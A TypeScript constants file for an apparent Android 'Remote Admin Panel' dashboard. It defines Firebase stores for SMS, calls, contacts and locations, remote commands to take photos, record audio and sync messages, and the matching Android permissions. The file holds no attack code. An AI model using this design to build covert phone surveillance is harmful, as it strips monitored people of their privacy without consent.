// Application constants and configuration

export const APP_CONFIG = {
  name: 'Remote Admin Panel',
  version: '1.0.0',
  description: 'Professional Android device monitoring dashboard',
  author: 'Remote Admin System',
} as const;

export const FIREBASE_CONFIG = {
  collections: {
    DEVICES: 'devices',
    SMS: 'sms',
    CALLS: 'calls',
    APP_USAGE: 'app_usage',
    CONTACTS: 'contacts',
    COMMANDS: 'commands',
    ADMIN_LOGS: 'admin_logs',
  },
  realtime: {
    DEVICES: 'devices',
    LOCATIONS: 'locations/current',
    COMMANDS: 'commands',
  },
} as const;

export const DEVICE_STATUS = {
  ONLINE: 'online',
  OFFLINE: 'offline',
  AWAY: 'away',
} as const;

export const COMMAND_TYPES = {
  GET_LOCATION: 'get_location',
  TAKE_PHOTO: 'take_photo',
  RECORD_AUDIO: 'record_audio',
  SYNC_SMS: 'sync_sms',
  SYNC_CALLS: 'sync_calls',
  RESTART_SERVICE: 'restart_service',
} as const;

export const COMMAND_STATUS = {
  PENDING: 'pending',
  SENT: 'sent',
  ACKNOWLEDGED: 'acknowledged',
  COMPLETED: 'completed',
  FAILED: 'failed',
} as const;

export const ACTIVITY_TYPES = {
  SMS: 'sms',
  CALL: 'call',
  LOCATION: 'location',
  APP_USAGE: 'app_usage',
  COMMAND: 'command',
  SYSTEM: 'system',
} as const;

export const REFRESH_INTERVALS = {
  DEVICES: 5000, // 5 seconds
  ACTIVITY: 10000, // 10 seconds
  LOCATION: 30000, // 30 seconds
  STATS: 60000, // 1 minute
} as const;

export const PAGINATION = {
  DEFAULT_LIMIT: 50,
  MAX_LIMIT: 100,
} as const;

export const LOCAL_STORAGE_KEYS = {
  DASHBOARD_STATE: 'dashboard_state',
  USER_PREFERENCES: 'user_preferences',
  SELECTED_DEVICE: 'selected_device',
} as const;

export const ROUTES = {
  LOGIN: '/login',
  DASHBOARD: '/dashboard',
  DEVICES: '/devices',
  ACTIVITY: '/activity',
  MAP: '/map',
  SETTINGS: '/settings',
} as const;

export const PERMISSIONS = {
  ANDROID: {
    LOCATION: 'android.permission.ACCESS_FINE_LOCATION',
    SMS: 'android.permission.READ_SMS',
    CALLS: 'android.permission.READ_CALL_LOG',
    CONTACTS: 'android.permission.READ_CONTACTS',
    CAMERA: 'android.permission.CAMERA',
    AUDIO: 'android.permission.RECORD_AUDIO',
    STORAGE: 'android.permission.READ_EXTERNAL_STORAGE',
    USAGE_STATS: 'android.permission.PACKAGE_USAGE_STATS',
  },
} as const;

export const ERROR_MESSAGES = {
  FIREBASE_CONNECTION: 'Failed to connect to Firebase. Please check your internet connection.',
  AUTHENTICATION_FAILED: 'Authentication failed. Please check your credentials.',
  PERMISSION_DENIED: 'Permission denied. Please contact your administrator.',
  DEVICE_OFFLINE: 'Device is currently offline. Commands cannot be sent.',
  COMMAND_FAILED: 'Command execution failed. Please try again.',
  INVALID_DATA: 'Invalid data received. Please refresh and try again.',
  NETWORK_ERROR: 'Network error occurred. Please check your connection.',
} as const;

export const SUCCESS_MESSAGES = {
  LOGIN_SUCCESS: 'Successfully logged in',
  COMMAND_SENT: 'Command sent successfully',
  DATA_UPDATED: 'Data updated successfully',
  LOGOUT_SUCCESS: 'Successfully logged out',
} as const;

export const NOTIFICATION_CONFIG = {
  POSITION: 'top-right',
  AUTO_CLOSE: 5000,
  HIDE_PROGRESS_BAR: false,
  CLOSE_ON_CLICK: true,
  PAUSEON_HOVER: true,
} as const;